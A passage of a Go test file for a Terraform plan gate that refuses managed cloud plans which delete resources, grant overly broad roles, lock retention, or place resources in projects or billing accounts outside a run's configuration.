		t.Fatalf("a computed role gives %q, want one refusal", out)
	}
}

// TestManagedCoverIsACover: the managed cover satisfies the interface the
// managed apply's gate takes (internal/managed/plan.go), and a nil plan is one
// refusal rather than none.
func TestManagedCoverIsACover(t *testing.T) {
	var _ interface {
		NotCovered(*Plan, []ImportKey) []string
	} = ManagedCover{}
	var _ interface {
		NotCovered(*Plan, []ImportKey) []string
	} = managedTestCover()
	if got := managedTestCover().NotCovered(nil, nil); len(got) != 1 || got[0] != "no plan" {
		t.Fatalf("a nil plan gives %q, want one refusal", got)
	}
}

// TestManagedCoverRefusesDeletesAndReplacements: the action set is create,
// update, no-op and read, and a delete or a replacement is admitted only for
// an exact address on the owner's delete list — which this cover was not told
// (design D72/D74), so it admits none of them. An action the managed list does
// not carry is refused rather than read as none, whatever the list says — a
// forget included, which tf.Guard allows and this cover does not (managedActions).
// The listed cases are below, in the tests of the delete rule itself.
func TestManagedCoverRefusesDeletesAndReplacements(t *testing.T) {
	for name, acts := range map[string][]string{
		"a delete":                           {"delete"},
		"a replacement, delete first":        {"delete", "create"},
		"a replacement, create first":        {"create", "delete"},
		"forget, an action the guard allows": {"forget"},
		"no actions":                         {},
	} {
		t.Run(name, func(t *testing.T) {
			rc := managedKeptFixture["google_storage_bucket"]
			rc.Change.Actions = acts
			if out := managedTestCover().NotCovered(managedPlan(rc), nil); len(out) != 1 || !strings.HasPrefix(out[0], rc.Address+" (") {
				t.Fatalf("%v gives %q, want one refusal", acts, out)
			}
		})
	}
}

// TestManagedCoverImports: an import is covered only when its ID is in the
// managed project's projects AND this run's discovery found it at that
// address — and a no-op that imports is an import, not a no-op to skip.
func TestManagedCoverImports(t *testing.T) {
	sa := managedKeptFixture["google_service_account"]
	const inProject = "projects/proj-1/serviceAccounts/" + managedAccount
	const elsewhere = "projects/other/serviceAccounts/" + ManagedPrefix + "sa@other.iam.gserviceaccount.com"
	importing := func(id string, acts ...string) ResourceChange {
		rc := sa
		rc.Change.Actions = acts
		rc.Change.Importing = &Importing{ID: id}
		return rc
	}
	for name, tc := range map[string]struct {
		rc      ResourceChange
		imports []ImportKey
		why     string
	}{
		"an import discovery found": {importing(inProject, "no-op"), []ImportKey{{sa.Address, inProject}}, ""},
		"an import of another project's account, even one discovery listed": {importing(elsewhere, "no-op"),
			[]ImportKey{{sa.Address, elsewhere}}, "which is not in the managed project's projects"},
		"a no-op import discovery did not find":     {importing(inProject, "no-op"), nil, "which this run's discovery did not find"},
		"an updating import discovery did not find": {importing(inProject, "update"), nil, "which this run's discovery did not find"},
		"an import discovery found at another address": {importing(inProject, "no-op"),
			[]ImportKey{{"module.other.google_service_account.this", inProject}}, "which this run's discovery did not find"},
	} {
		t.Run(name, func(t *testing.T) {
			out := managedTestCover().NotCovered(managedPlan(tc.rc), tc.imports)
			if tc.why == "" {
				if len(out) != 0 {
					t.Fatalf("gives %q, want it covered", out)
				}
				return
			}
			if len(out) != 1 || !strings.Contains(out[0], tc.why) {
				t.Fatalf("gives %q, want one refusal %q", out, tc.why)
			}
		})
	}
}

// TestManagedCoverListedMembersArePeople: the review's listed members admit a
// person or a group, never an account — a service account on the review
// screen is still not one the managed project owns, and only a managed account
// is granted to as an account.
func TestManagedCoverListedMembersArePeople(t *testing.T) {
	const outsider = "serviceAccount:ci@other.iam.gserviceaccount.com"
	c := managedTestCover()
	c.Listed = append(slices.Clone(c.Listed), outsider)
	rc := mrc("google_storage_bucket_iam_member", map[string]any{
		"bucket": ManagedPrefix + "bucket", "member": outsider, "role": "roles/storage.objectViewer"})
	if out := c.NotCovered(managedPlan(rc), nil); len(out) != 1 || !strings.Contains(out[0], "which is not a user or a group") {
		t.Fatalf("a listed service account gives %q, want one refusal: not a user or a group", out)
	}
}

// TestManagedCoverRefusalNamesTheListsTheInstallationHas: the sentence a plan
// that grants a role to somebody outside Cover.Listed is refused with. A
// managed apply's cover is built from an installation's own configuration
// (internal/cli's managedCover, the only place a ManagedCover is built), and
// that command has no review screen at all — the refusal said "who is not on
// the review screen", naming a screen the operator of `fugaro managed apply`
// never saw and cannot go and look at, while saying nothing about the one thing
// they can act on. The lists the member has to be on are the installation's
// own, and the refusal names them.
//
// Mutation (verified, run and restored): put "who is not on the review screen"
// back — the first assertion below fails.
func TestManagedCoverRefusalNamesTheListsTheInstallationHas(t *testing.T) {
	const outsider = "user:eve@example.com"
	rc := mrc("google_storage_bucket_iam_member", map[string]any{
		"bucket": ManagedPrefix + "bucket", "member": outsider, "role": "roles/storage.objectViewer"})
	out := managedTestCover().NotCovered(managedPlan(rc), nil)
	if len(out) != 1 {
		t.Fatalf("a grant to %s gives %q, want one refusal", outsider, out)
	}
	if strings.Contains(out[0], "review screen") {
		t.Errorf("the refusal names a review screen, which a managed apply does not have: %q", out[0])
	}
	if !strings.Contains(out[0], outsider) {
		t.Errorf("the refusal does not name the member it refused: %q", out[0])
	}
	// The three lists are the ones the config records, and naming them is the
	// sentence's whole use: it says which key to edit. A budget admin is among
	// them (internal/cli's managedCover puts terraform.budget_admins in Listed),
	// so the sentence must not read as launchers-and-operators only.
	for _, want := range []string{"launchers", "operators", "budget admins"} {
		if !strings.Contains(out[0], want) {
			t.Errorf("the refusal does not name the %s: %q", want, out[0])
		}
	}
	// A member who *is* on one of them is covered, so the sentence above is
	// what a refusal costs and not what every grant costs.
	admin := mrc("google_storage_bucket_iam_member", map[string]any{
		"bucket": ManagedPrefix + "bucket", "member": "user:budget@example.com", "role": "roles/storage.objectViewer"})
	c := managedTestCover()
	c.Listed = append(slices.Clone(c.Listed), "user:budget@example.com")
	if out := c.NotCovered(managedPlan(admin), nil); len(out) != 0 {
		t.Errorf("a grant to a listed budget admin gives %q, want it covered", out)
	}
}

// TestManagedCoverSchedulerOIDC: a scheduler may call with an OIDC token as
// well as an OAuth one, and the OIDC account is held to the same rule.
func TestManagedCoverSchedulerOIDC(t *testing.T) {
	sched := func(tokens map[string]string) ResourceChange {
		ht := map[string]any{}
		for tok, email := range tokens {
			ht[tok] = []any{map[string]any{"service_account_email": email}}
		}
		return mrc("google_cloud_scheduler_job", map[string]any{"name": ManagedPrefix + "sweep", "http_target": []any{ht}})
	}
	const compute = "123456789-compute@developer.gserviceaccount.com"
	if out := managedTestCover().NotCovered(managedPlan(sched(map[string]string{"oidc_token": managedAccount})), nil); len(out) != 0 {
		t.Errorf("a scheduler calling with an OIDC token as a managed account gives %q, want it covered", out)
	}
	for name, tokens := range map[string]map[string]string{
		"OIDC as the default compute account":             {"oidc_token": compute},
		"OAuth managed, OIDC the default compute account": {"oauth_token": managedAccount, "oidc_token": compute},
	} {
		t.Run(name, func(t *testing.T) {
			if out := managedTestCover().NotCovered(managedPlan(sched(tokens)), nil); len(out) != 1 || !strings.Contains(out[0], compute) {
				t.Fatalf("gives %q, want one refusal naming %s", out, compute)
			}
		})
	}
}

// TestManagedCoverRefusesAVirtualOrRemoteRepository: a repository carrying the
// prefix can still be a virtual one whose upstream is Fugaro's own fugaro-base,
// or a remote one whose upstream password is one of Fugaro's secrets, so the
// prefix alone does not keep it the managed project's. A managed repository is
// a standard one (the provider's default, which the plan shows when unset);
// what else a repository points at is Task 1.2's.
func TestManagedCoverRefusesAVirtualOrRemoteRepository(t *testing.T) {
	repo := func(after map[string]any) ResourceChange {
		after["repository_id"], after["format"] = ManagedPrefix+"repo", "DOCKER"
		return mrc("google_artifact_registry_repository", after)
	}
	for name, rc := range map[string]ResourceChange{
		"virtual":  repo(map[string]any{"mode": "VIRTUAL_REPOSITORY"}),
		"remote":   repo(map[string]any{"mode": "REMOTE_REPOSITORY"}),
		"no mode":  repo(map[string]any{}),
		"computed": withUnknown(repo(map[string]any{}), map[string]any{"mode": true}),
	} {
		t.Run(name, func(t *testing.T) {
			if out := managedTestCover().NotCovered(managedPlan(rc), nil); len(out) != 1 || !refusedWith(out, rc.Address+" (", "STANDARD_REPOSITORY") {
				t.Fatalf("gives %q, want one refusal naming STANDARD_REPOSITORY", out)
			}
		})
	}
	if out := managedTestCover().NotCovered(managedPlan(repo(map[string]any{"mode": "STANDARD_REPOSITORY"})), nil); len(out) != 0 {
		t.Errorf("a standard repository gives %q, want it covered", out)
	}
}

// updating is rc as an in-place update: the same checks hold for an update as
// for a create, because an update's after is what the resource becomes.
func updating(rc ResourceChange) ResourceChange {
	rc.Change.Actions = []string{"update"}
	rc.Change.Before = map[string]any{}
	return rc
}

// TestManagedCoverChecksUpdates: an update is held to every rule a create is —
// one fixture per rule family, each refused, beside an update the list admits.
// Only a no-op or a read skips the checks; a cover that skipped an update too
// would admit each row below.
func TestManagedCoverChecksUpdates(t *testing.T) {
	const runs = "fugaro-runs-proj-1"
	grant := func(bucket, member, role string) ResourceChange {
		return mrc("google_storage_bucket_iam_member", map[string]any{"bucket": bucket, "member": member, "role": role})
	}
	computedMember := mrc("google_storage_bucket_iam_member", map[string]any{"bucket": ManagedPrefix + "bucket", "role": "roles/storage.objectViewer"})
	computedMember.Change.AfterUnknown = map[string]any{"member": true}
	for name, tc := range map[string]struct {
		rc  ResourceChange
		why string
	}{
		"a type outside the allowlist": {mrc("google_compute_instance", map[string]any{"name": ManagedPrefix + "vm"}),
			"a resource type outside the managed project's allowlist"},
		"the runs bucket by its name": {mrc("google_storage_bucket", map[string]any{"name": runs}),
			"outside the managed prefix"},
		"allUsers on the runs bucket": {grant(runs, "allUsers", "roles/storage.objectViewer"),
			"on bucket " + runs + ", which is not the managed project's"},
		"allUsers on a managed bucket": {grant(ManagedPrefix+"bucket", "allUsers", "roles/storage.objectViewer"),
			"grants to allUsers, which is everyone"},
		"a computed member": {computedMember, "a member that is not known at plan time"},
		"a basic role":      {grant(ManagedPrefix+"bucket", "user:owner@example.com", "roles/owner"), "basic role roles/owner"},
		"a retention policy locked by the update": {mrc("google_storage_bucket", map[string]any{"name": ManagedPrefix + "bucket",
			"retention_policy": []any{map[string]any{"is_locked": true, "retention_period": float64(3600)}}}), "retention policy is locked"},
	} {
		t.Run(name, func(t *testing.T) {
			rc := updating(tc.rc)
			out := managedTestCover().NotCovered(managedPlan(rc), nil)
			if len(out) != 1 || !refusedWith(out, rc.Address+" (", tc.why) {
				t.Fatalf("an update gives %q, want one refusal %q", out, tc.why)
			}
		})
	}
	for _, typ := range ManagedAllowedTypes() {
		t.Run("admitted "+typ, func(t *testing.T) {
			if out := managedTestCover().NotCovered(managedPlan(updating(managedKeptFixture[typ])), nil); len(out) != 0 {
				t.Fatalf("an update of the %s fixture gives %q, want it covered", typ, out)
			}
		})
	}
}

// TestManagedCoverRefusesLocks: a locked retention policy on a bucket, or an
// object retained in mode Locked, can never be undone — the bucket cannot be
// deleted until the retention runs out and a locked bucket can hold a lien on
// the project — so a managed plan locks nothing. The fixtures are the plan
// JSON's own shape: retention_policy and retention are lists of one block,
// and after_unknown mirrors them. An unlocked policy, an Unlocked retention
// and no retention at all are admitted.
func TestManagedCoverRefusesLocks(t *testing.T) {
	bucket := func(policy map[string]any, unknown map[string]any) ResourceChange {
		after := map[string]any{"name": ManagedPrefix + "bucket"}
		if policy != nil {
			after["retention_policy"] = []any{policy}
		}
		return withUnknown(mrc("google_storage_bucket", after), unknown)
	}
	object := func(retention map[string]any, unknown map[string]any) ResourceChange {
		after := map[string]any{"bucket": ManagedPrefix + "bucket", "name": "results.json", "content": "{}"}
		if retention != nil {
			after["retention"] = []any{retention}
		}
		return withUnknown(mrc("google_storage_bucket_object", after), unknown)
	}
	const until = "2066-01-01T00:00:00Z"
	for name, tc := range map[string]struct {
		rc  ResourceChange
		why string
	}{
		"a locked retention policy": {bucket(map[string]any{"is_locked": true, "retention_period": float64(3600)}, map[string]any{}),
			"retention policy is locked"},
		"a computed lock": {bucket(map[string]any{"retention_period": float64(3600)},
			map[string]any{"retention_policy": []any{map[string]any{"is_locked": true}}}), "retention policy lock is not known"},
		"a computed retention policy": {bucket(nil, map[string]any{"retention_policy": true}), "retention policy lock is not known"},
		"a computed policy element": {bucket(map[string]any{}, map[string]any{"retention_policy": []any{true}}),
			"retention policy lock is not known"},
		"an object retained Locked": {object(map[string]any{"mode": "Locked", "retain_until_time": until}, map[string]any{}),
			"retention mode is Locked"},
		"an object retained LOCKED": {object(map[string]any{"mode": "LOCKED", "retain_until_time": until}, map[string]any{}),
			"retention mode is Locked"},
		"an object retained locked": {object(map[string]any{"mode": "locked", "retain_until_time": until}, map[string]any{}),
			"retention mode is Locked"},
		"a computed retention mode": {object(map[string]any{"retain_until_time": until},
			map[string]any{"retention": []any{map[string]any{"mode": true}}}), "retention mode is not known"},
		"a computed retention": {object(nil, map[string]any{"retention": true}), "retention mode is not known"},
	} {
		t.Run(name, func(t *testing.T) {
			out := managedTestCover().NotCovered(managedPlan(tc.rc), nil)
			if len(out) != 1 || !refusedWith(out, tc.rc.Address+" (", tc.why) {
				t.Fatalf("gives %q, want one refusal %q", out, tc.why)
			}
		})
	}
	for name, rc := range map[string]ResourceChange{
		"an unlocked retention policy": bucket(map[string]any{"is_locked": false, "retention_period": float64(3600)}, map[string]any{}),
		"a policy with no lock set":    bucket(map[string]any{"retention_period": float64(3600)}, map[string]any{}),
		"no retention policy":          bucket(nil, map[string]any{}),
		"an object retained Unlocked":  object(map[string]any{"mode": "Unlocked", "retain_until_time": until}, map[string]any{}),
		"an object with no retention":  object(nil, map[string]any{}),
	} {
		t.Run(name, func(t *testing.T) {
			if out := managedTestCover().NotCovered(managedPlan(rc), nil); len(out) != 0 {
				t.Fatalf("gives %q, want it covered", out)
			}
		})
	}
}

// Task 1.2: the attributes a managed plan must still satisfy. Cover's own
// attribute checks (cover.go:713-827) are re-derived for a managed project the
// way Task 1.1 re-derived the type list: each is re-justified rather than
// inherited, the two that carry the spec's step 3 are kept, and the ones that
// only make sense for Fugaro's own embedded modules are dropped with a fixture
// that now passes, so the dropping is a diff rather than a silence. The two
// kept ones are read where they can fire: the project rule on the resource and
// on the provider block that decides the project of a resource left to it, and
// the billing rule before the type rule that would otherwise refuse every
// budget before its account was read.

// TestManagedCoverProjectScope is the first retained check: the project every
// resource is in, kept as the WIDER rule Cover.Projects is — a resource is
// refused when its project is not one of this run's, not merely when it is not
// the managed project — so a resource in a second project Fugaro owns is
// refused too (D61's "the project each resource is in", the spec's step 3).
// The refusal is by address and names the project.
func TestManagedCoverProjectScope(t *testing.T) {
	const second = "proj-2"
	bucket := func(project string) ResourceChange {
		after := map[string]any{"name": ManagedPrefix + "bucket"}
		if project != "" {
			after["project"] = project
		}
		return mrc("google_storage_bucket", after)
	}
	twoProjects := managedTestCover()
	twoProjects.Projects = []string{"proj-1", second}
	for name, tc := range map[string]struct {
		c  ManagedCover
		rc ResourceChange
	}{
		"the managed project":               {managedTestCover(), bucket("proj-1")},
		"a second project of this run":      {twoProjects, bucket(second)},
		"no project, so the provider's own": {managedTestCover(), bucket("")},
	} {
		t.Run("admits "+name, func(t *testing.T) {
			if out := tc.c.NotCovered(managedPlan(tc.rc), nil); len(out) != 0 {
				t.Fatalf("gives %q, want it covered", out)
			}
		})
	}
	// A project known only after apply is two cases the plan's value cannot
	// tell apart: the resource leaves project to its provider block, or sets it
	// from something computed. Only the configuration tells them apart.
	late := withUnknown(bucket(""), map[string]any{"project": true})
	t.Run("admits a project known only after apply that the resource leaves to its provider block", func(t *testing.T) {
		if out := managedTestCover().NotCovered(managedPlanConfigured(late, nil), nil); len(out) != 0 {
			t.Fatalf("gives %q, want it covered", out)
		}
	})
	for name, p := range map[string]*Plan{
		"a project the resource sets, known only after apply": managedPlanConfigured(late,
			map[string]json.RawMessage{"project": json.RawMessage(`{"references":["google_service_account.a.unique_id","google_service_account.a"]}`)}),
		"a project the resource sets to a constant, yet known only after apply": managedPlanConfigured(late,
			map[string]json.RawMessage{"project": json.RawMessage(`{"constant_value":"proj-1"}`)}),
		"a project known only after apply, of a resource the configuration does not declare": managedPlan(late),
	} {
		t.Run("refuses "+name, func(t *testing.T) {
			out := managedTestCover().NotCovered(p, nil)
			if len(out) != 1 || !strings.HasPrefix(out[0], late.Address+" (") || !strings.Contains(out[0], "project") {
				t.Fatalf("gives %q, want one refusal at %s for its project", out, late.Address)
			}
		})
	}
	rc := bucket(second)
	out := managedTestCover().NotCovered(managedPlan(rc), nil)
	if len(out) != 1 || !strings.HasPrefix(out[0], rc.Address+" (") ||
		!strings.Contains(out[0], "in project "+second+", which is not this run's") {
		t.Fatalf("a resource in %s gives %q, want one refusal at %s naming the project", second, out, rc.Address)
	}
}

// TestManagedCoverRefusesAComputedProjectAResourceSets is terraform's own
// output (terraform 1.16.4 and google 8.4.0, planned offline from the plugin
// cache with a placeholder token and every proxy pointed at a closed port,
// never applied): a resource that sets project = "${substr(
// google_service_account.a.unique_id, 0, 0)}proj-2" is written with
// after_unknown.project true, exactly as a resource that leaves its project
// to its provider block, and applies into proj-2. The configuration is what
// tells them apart — its project expression — so every such resource is
// refused: in the root (a bucket and a secret), in a child module whose
// project = var.p is fed the computed value by its call, and as count and
// for_each instances, a module's for_each instance included, whose addresses
// carry an index the configuration's do not. The control from the same
// terraform is the same shapes with no project set at all: each inherits
// proj-1 from the provider block and is admitted, so the rule refuses the
// computed project and not the unknown one.
func TestManagedCoverRefusesAComputedProjectAResourceSets(t *testing.T) {
	for fixture, addrs := range map[string][]string{
		"managed_resource_computed_project_plan.json": {
			"google_secret_manager_secret.s", "google_storage_bucket.b"},
		"managed_resource_computed_project_module_plan.json": {
			"module.m.google_secret_manager_secret.s", "module.m.google_storage_bucket.b"},
		"managed_resource_computed_project_instances_plan.json": {
			`google_secret_manager_secret.f["x.y"]`, `google_secret_manager_secret.f["z[0]"]`,
			"google_storage_bucket.c[0]", "google_storage_bucket.c[1]", `module.m["k"].google_storage_bucket.b[0]`},
		// Real plan output (terraform 1.16, google 8.4.0): the root bucket sets
		// a computed project and module.m has an identically named bucket that
		// sets none: only the root one is refused, so a lookup that drops the
		// module path on both sides is caught.
		"managed_resource_computed_project_samename_plan.json": {
			"google_storage_bucket.a"},
		// The same type.name at four module paths: only module.x's sets a
		// computed project (var.p), and so does module.y.module.x's.
		"managed_resource_computed_project_samename_paths_plan.json": {
			"module.x.google_storage_bucket.a", "module.y.module.x.google_storage_bucket.a"},
	} {
		t.Run(fixture, func(t *testing.T) {
			out := managedTestCover().NotCovered(readPlanFixture(t, fixture), nil)
			for _, addr := range addrs {
				if !refusedWith(out, addr+" (", "project", "known only after apply") {
					t.Errorf("gives %q, want %s refused for a computed project", out, addr)
				}
			}
			if len(out) != len(addrs) {
				t.Errorf("gives %d refusals %q, want the %d resources that set a computed project alone", len(out), out, len(addrs))
			}
		})
	}
	if out := managedTestCover().NotCovered(readPlanFixture(t, "managed_resource_inherited_project_plan.json"), nil); len(out) != 0 {
		t.Fatalf("the same shapes leaving project to the provider block give %q, want them covered", out)
	}
}

// TestManagedConfigAddress pins how a resource change's address finds its
// configuration entry: every instance key goes, a module's included, and a
// key's quoted text is read as text, brackets, dots and escapes included.
func TestManagedConfigAddress(t *testing.T) {
	for in, want := range map[string]string{
		"google_storage_bucket.b":                         "google_storage_bucket.b",
		"google_storage_bucket.c[1]":                      "google_storage_bucket.c",
		`google_secret_manager_secret.f["z[0]"]`:          "google_secret_manager_secret.f",
		`module.m["k"].google_storage_bucket.b[0]`:        "module.m.google_storage_bucket.b",
		`module.a[0].module.b["x\"]y"].google_x.y["a.b"]`: "module.a.module.b.google_x.y",
	} {
		if got := managedConfigAddress(in); got != want {
			t.Errorf("managedConfigAddress(%q) = %q, want %q", in, got, want)
		}
	}
}

// TestManagedCoverBillingAccount is the second retained check: the billing
// account the review showed, which is what makes a plan that moves billing
// refuse. It is read before the type rule and asserted through NotCovered,
// because google_billing_budget is off the managed list (Task 1.1's
// managedDropped: a billing-account permission no project role can hold): read
// after it, this rule could never fire — every budget would be refused for its
// type first and the account would go unread — while read before it, a plan
// that moves billing is refused for the account it moves it to, which is the
// rule's own reason for existing. The type's refusal is asserted beside it, so
// neither half can be mistaken for the other.
func TestManagedCoverBillingAccount(t *testing.T) {
	budget := func(account string) ResourceChange {
		return mrc("google_billing_budget", map[string]any{"billing_account": account})
	}
	// The passing fixture: the review's own account, which this rule admits —
	// the refusal that follows is the type's.
	out := managedTestCover().NotCovered(managedPlan(budget("billingAccounts/AAAA-BBBB")), nil)
	if len(out) != 1 || !strings.Contains(out[0], "the managed project's allowlist leaves out") {
		t.Fatalf("a budget on the review's account gives %q, want one refusal for its type", out)
	}
	for name, account := range map[string]string{
		"another billing account": "billingAccounts/CCCC-DDDD",
		"no billing account":      "",
	} {
		t.Run("refuses "+name, func(t *testing.T) {
			out := managedTestCover().NotCovered(managedPlan(budget(account)), nil)
			if !refusedWith(out, budget(account).Address+" (", "billing account") {
				t.Fatalf("gives %q, want the billing account refused", out)
			}
		})
	}
}

// TestManagedCoverBillingAccountOnAnyType is the property the rule rests on —
// it reads the attribute, not the type — asserted on a type the managed list
// keeps, so no type refusal stands in for it: a kept resource carrying a
// billing account outside the review is refused for the account, and one
// carrying the review's own is admitted. A rule that read rc.Type (the old
// google_billing_budget guard) admits the first and fails here.
func TestManagedCoverBillingAccountOnAnyType(t *testing.T) {
	bucket := func(account string) ResourceChange {
		return mrc("google_storage_bucket", map[string]any{"name": ManagedPrefix + "b", "billing_account": account})
	}
	if out := managedTestCover().NotCovered(managedPlan(bucket("billingAccounts/AAAA-BBBB")), nil); len(out) != 0 {
		t.Fatalf("a kept type on the review's account gives %q, want it covered", out)
	}
	for name, account := range map[string]string{
		"another billing account": "billingAccounts/CCCC-DDDD",
		"no billing account":      "",
	} {
		t.Run("refuses "+name, func(t *testing.T) {
			rc := bucket(account)
			out := managedTestCover().NotCovered(managedPlan(rc), nil)
			if len(out) != 1 || !refusedWith(out, rc.Address+" (", "billing account") {
				t.Fatalf("gives %q, want one refusal, for the billing account", out)
			}
		})
	}
}

// providerProjectPlan is a plan of one managed bucket whose root provider
// block sets project from expr, with the plan's own variables beside it when
// given. It is the shape terraform writes for a resource left to its provider
// block (testdata/managed_provider_clean_plan.json): the bucket's own project
// is unknown, and the block decides where it lands.
func providerProjectPlan(t *testing.T, project map[string]any, variables any) *Plan {
	t.Helper()
	cfg := config(nil, []map[string]any{bucketConfig()}, nil)
	cfg["provider_config"] = map[string]any{"google": map[string]any{
		"name": "google", "full_name": googleProvider,
		"expressions": map[string]any{"project": project}}}
	doc := map[string]any{"format_version": "1.2",
		"resource_changes": []any{bucketChange("google_storage_bucket.b", ManagedPrefix+"b", googleProvider)},
		"configuration":    cfg}
	if variables != nil {
		doc["variables"] = variables
	}
	data, err := json.Marshal(doc)
	if err != nil {
		t.Fatal(err)
	}
	p, err := parsePlan(data)
	if err != nil {
		t.Fatal(err)
	}
	return p
}

// TestManagedCoverRefusesAForeignProjectInAProviderBlock is the project rule
// one level up, and it is what the rule's own justification rests on: a
// resource that leaves its project to its provider block is admitted because
// that block decides where it lands, so the block's project is read too.
// Without this, the wider rule is bypassed by moving the project one line up:
// the same resource that is refused for naming proj-2 itself is covered when
// the block names it.
//
// The rule admits a project written out and nothing else. A reference is
// refused even when the plan shows the variable's value as this run's
// project: terraform writes replace(var.project, ...) exactly as it writes
// var.project (TestManagedCoverRefusesAProviderProjectBehindAFunction), so
// the plan cannot prove the block reads the variable bare. The wider rule is
// pinned here too: a second project of this run is admitted in a provider
// block exactly as it is on a resource (TestManagedCoverProjectScope).
func TestManagedCoverRefusesAForeignProjectInAProviderBlock(t *testing.T) {
	val := func(v any) map[string]any { return map[string]any{"project": map[string]any{"value": v}} }
	twoProjects := managedTestCover()
	twoProjects.Projects = []string{"proj-1", "proj-2"}
	admits := map[string]struct {
		c       ManagedCover
		project map[string]any
	}{
		"written out": {managedTestCover(), constant("proj-1")},
		"a second project of this run, written out": {twoProjects, constant("proj-2")},
	}
	for name, tc := range admits {
		t.Run("admits a provider block whose project is "+name, func(t *testing.T) {
			if out := tc.c.NotCovered(providerProjectPlan(t, tc.project, nil), nil); len(out) != 0 {
				t.Fatalf("gives %q, want it covered", out)
			}
		})
	}
	refuses := map[string]struct {
		project   map[string]any
		variables any
		want      string
	}{
		"written out and not this run's":                                 {constant("proj-2"), nil, "lands resources in project proj-2"},
		"read from a variable the plan shows as this run's":              {refs("var.project"), val("proj-1"), "var.project"},
		"read from a variable the plan shows and not this run's":         {refs("var.project"), val("proj-2"), "var.project"},
		"read from a variable the plan does not show":                    {refs("var.project"), nil, "var.project"},
		"read from a variable the plan shows no value for":               {refs("var.project"), map[string]any{"other": map[string]any{"value": "proj-1"}}, "var.project"},
		"read from a variable whose value is not a string":               {refs("var.project"), val([]any{"proj-1"}), "var.project"},
		"read from two variables":                                        {refs("var.a", "var.b"), map[string]any{"a": map[string]any{"value": "proj-1"}, "b": map[string]any{"value": "proj-1"}}, "project"},
		"read from a variable's attribute":                               {refs("var.p.id", "var.p"), map[string]any{"p": map[string]any{"value": map[string]any{"id": "proj-1"}}}, "project"},
		"written out as null":                                            {constant(nil), nil, "project"},
		"written out as something other than a string":                   {constant(1), nil, "project"},
		"written out as an empty string":                                 {constant(""), nil, "project"},
		"written out beside a reference (a form terraform never writes)": {map[string]any{"constant_value": "proj-1", "references": []any{"var.project"}}, val("proj-1"), "project"},
	}
	for name, tc := range refuses {
		t.Run("refuses a provider block whose project is "+name, func(t *testing.T) {
			out := managedTestCover().NotCovered(providerProjectPlan(t, tc.project, tc.variables), nil)
			if !refusedWith(out, "provider_config.google (", tc.want) {
				t.Fatalf("gives %q, want the provider block refused for the project its resources land in", out)
			}
		})
	}
}

// TestManagedCoverRefusesAProviderProjectBehindAFunction is the residual the
// previous revision's variable resolution left, on terraform's own output
// (terraform 1.16.4 and google 8.4.0, planned offline from the plugin cache
// with a placeholder token and every proxy pointed at a closed port): a root
// whose var.project is proj-1, and provider blocks whose project is
// replace(var.project, "1", "2") (the root's own, which lands its bucket in
// proj-2), "${var.project}-x", lower(var.project), var.project == "proj-1" ?
// "proj-2" : "proj-1", tostring(var.project) and var.project bare, one module
// each, every call passing proj-1. Terraform writes every one of them as
// {"references": ["var.project"]} and nothing else, so the plan cannot tell
// the bare reference from the wrapped ones, and the previous rule read all
// six as proj-1 and admitted the plan. Now a provider block's project is
// admitted only written out (testdata/managed_provider_module_project_clean_plan.json),
// so all six are refused, and the module whose block sets no project with them.
func TestManagedCoverRefusesAProviderProjectBehindAFunction(t *testing.T) {
	out := managedTestCover().NotCovered(readPlanFixture(t, "managed_provider_wrapped_project_plan.json"), nil)
	for _, block := range []string{"google", "module.tmpl:google", "module.lower:google", "module.cond:google",
		"module.tostr:google", "module.bare:google"} {
		if !refusedWith(out, "provider_config."+block+" (", "var.project", "not written out") {
			t.Errorf("gives %q, want %s refused for a project it does not write out", out, block)
		}
	}
	if !refusedWith(out, "provider_config.module.empty:google (", "sets no project") {
		t.Errorf("gives %q, want module.empty's block refused for setting no project", out)
	}
	if len(out) != 7 {
		t.Errorf("gives %d refusals %q, want the seven provider blocks alone", len(out), out)
	}
	// terraform's own output for a root block reading var.project bare, the
	// plan the previous revision admitted as its positive control.
	out = managedTestCover().NotCovered(readPlanFixture(t, "managed_provider_variable_project_plan.json"), nil)
	if len(out) != 1 || !refusedWith(out, "provider_config.google (", "var.project", "not written out") {
		t.Errorf("a root block reading var.project bare gives %q, want it refused alone", out)
	}
}

// TestManagedCoverRefusesAProviderWithoutAProject: a provider block that sets
// no project takes one, at apply, from the environment of whoever applies —
// GOOGLE_PROJECT and its aliases, then gcloud's configuration — and terraform
// writes the project of every resource left to it as unknown, which the
// resource rule admits. Neither is in the plan, so a managed plan's provider
// configurations each write their project out, including the one terraform
// configures by itself when the plan declares no provider block at all
// (testdata/managed_provider_no_project_plan.json is its output: a
// provider_config entry with no expressions).
func TestManagedCoverRefusesAProviderWithoutAProject(t *testing.T) {
	out := managedTestCover().NotCovered(readPlanFixture(t, "managed_provider_no_project_plan.json"), nil)
	if len(out) != 1 || !refusedWith(out, "provider_config.google (", "sets no project") {
		t.Errorf("a plan with no provider block gives %q, want its implicit provider refused alone", out)
	}
	for name, pc := range map[string]map[string]any{
		"an empty block":                      {"name": "google", "full_name": googleProvider},
		"a block whose expressions are empty": {"name": "google", "full_name": googleProvider, "expressions": map[string]any{}},
		"a block setting region alone": {"name": "google", "full_name": googleProvider,
			"expressions": map[string]any{"region": constant("us-east5")}},
		"google-beta, implicit in a module": {"name": "google-beta", "full_name": googleBetaProvider, "module_address": "module.m"},
	} {
		t.Run(name, func(t *testing.T) {
			cfg := config(map[string]string{"google": googleProvider}, []map[string]any{bucketConfig()}, nil)
			cfg["provider_config"].(map[string]any)["x"] = pc
			out := managedTestCover().NotCovered(jsonPlan(t, []map[string]any{bucketChange("google_storage_bucket.b", ManagedPrefix+"b", googleProvider)}, cfg), nil)
			if len(out) != 1 || !refusedWith(out, "provider_config.x (", "sets no project") {
				t.Fatalf("gives %q, want the block refused alone for setting no project", out)
			}
		})
	}
}

// TestManagedCoverRefusesAProjectPassedThroughAModuleCall is terraform's own
// output (terraform 1.16.4 and google 8.4.0, planned offline from the plugin
// cache with a placeholder token and every proxy pointed at a closed port):
// three modules whose own provider blocks say project = var.project, and
// three ways a call hands that variable proj-2 — written out in the call
// (module.m), through the root's own variable two levels down (module.a
// passes var.other to module.b), and as the module variable's default with
// nothing passed (module.d) — beside a root block that reads var.project,
// proj-1. Every one is refused, the root's too: a reference is not proof of
// the value (TestManagedCoverRefusesAProviderProjectBehindAFunction). The same
// plan with proj-1 written out in each provider block is admitted, so the rule
// refuses the form rather than the shape.
func TestManagedCoverRefusesAProjectPassedThroughAModuleCall(t *testing.T) {
	out := managedTestCover().NotCovered(readPlanFixture(t, "managed_provider_module_project_plan.json"), nil)
